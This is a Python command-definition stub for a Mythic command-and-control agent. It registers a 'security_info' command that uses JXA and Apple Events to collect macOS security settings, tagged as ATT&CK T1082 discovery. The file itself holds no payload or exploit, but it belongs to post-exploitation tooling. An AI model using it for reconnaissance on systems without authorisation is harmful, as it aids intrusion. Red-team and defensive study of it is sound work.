from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class SecurityInfoArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class SecurityInfoCommand(CommandBase):
    cmd = "security_info"
    needs_admin = False
    help_cmd = "security_info"
    description = 'This uses JXA to list some security information about the system by contacting the "System Events" application via Apple Events. This can cause a popup or be denied in Mojave and later'
    version = 1
    author = "@its_a_feature_"
    attackmapping = ["T1082"]
    argument_class = SecurityInfoArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="Target Application of System Events",
            artifact_type="AppleEvent Sent",
        )
        return task

    async def process_response(self, response: AgentResponse):
        pass
